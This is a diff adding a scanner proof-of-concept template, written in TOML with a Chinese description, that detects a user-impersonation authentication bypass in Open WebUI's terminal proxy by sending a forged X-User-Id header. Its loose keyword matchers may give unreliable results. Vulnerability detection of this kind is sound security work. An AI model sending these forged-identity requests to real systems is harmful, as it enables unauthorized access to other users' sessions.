@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "检测 Open WebUI 终端代理是否允许通过伪造 X-User-Id 标头或 session_id 查询注入实现用户身份冒充。向 /proxy/terminal 端点发送带伪造 X-User-Id 的请求，若服务端未校验该标头的完整性，则存在漏洞。"
+id = "POC-AVE-2026-0823"
+name = "Open WebUI 终端代理用户身份认证绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-0823"]
+vuln_id = [
+    "CVE-2026-59224",
+    "AVE-2026-0823",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/proxy/terminal"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+X-User-Id = "attacker-controlled-id"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "terminal",
+    "session",
+    "user_id",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/chat/completions"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
